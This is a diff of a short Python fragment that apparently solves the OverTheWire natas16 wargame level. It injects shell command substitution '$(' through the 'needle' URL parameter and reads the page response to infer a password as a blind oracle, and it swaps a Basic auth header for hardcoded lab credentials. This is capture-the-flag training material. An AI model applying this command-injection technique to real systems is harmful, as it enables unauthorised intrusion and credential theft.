@@ -1,14 +1,16 @@
 import requests,string
 base_url ="http://natas16.natas.labs.overthewire.org/index.php?needle=$("
 characters = ''.join([string.ascii_letters,string.digits])
-auth_headers = {'Authorization': 'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=='} 
+
+username="natas16"
+password="TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
 
 passwd=''
 passwd_len=len(passwd)
 
 def check(query):
     url = base_url + query + ")&submit=Search"
-    res = requests.get(url, headers=auth_headers)
+    res = requests.get(url, auth=(username, password))
     if("African" in res.text):
         return False
     return True
